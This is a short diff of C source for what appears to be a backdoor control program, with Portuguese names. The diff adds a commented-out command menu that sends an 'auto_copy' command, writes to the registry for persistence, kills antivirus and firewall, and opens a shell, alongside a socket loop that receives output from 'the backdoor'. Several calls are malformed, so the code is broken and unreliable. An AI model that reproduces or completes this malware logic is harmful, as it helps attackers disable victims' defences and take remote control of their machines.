@@ -20,6 +20,39 @@
 #define false 0
 #define true 1
 
+/*
+void escolha()
+
+
+{
+  char option;
+  int skt;
+      switch(option)
+      {
+
+      case '1':
+           send(skt,'auto_copy',NULL,NULL);
+           break;
+      case '2':
+           copy_to_registry();
+           return;
+      case '3':
+          kill_antivirus();
+          return;
+      case '4':
+           kill_firewall();
+
+      case '5':
+           shell();
+           default:
+
+                  sleep(0.2);
+                  return;
+
+      }
+
+
+} */
 int main()
 
     {
@@ -62,16 +95,16 @@ int main()
         //send(skt,mensagem,strlen(mensagem), 0);
 
         /*recv from backdoor*/
-        buf = recv(skt, mensagem,bytes, 0);
-        mensagem[buf]=0x00;
-        printf("\n%s\n",mensagem);
+        //buf = recv(skt, mensagem,bytes, 0);
+        //mensagem[buf]=0x00;
+        //printf("\n%s\n",mensagem);
 
 
         /*loop between server and backdoor
         */
         do {
 
-        //recv
+        //recebe
         buf = recv(skt,mensagem,bytes,0);
         mensagem[buf]=0x00;
         printf("%s\n",mensagem);
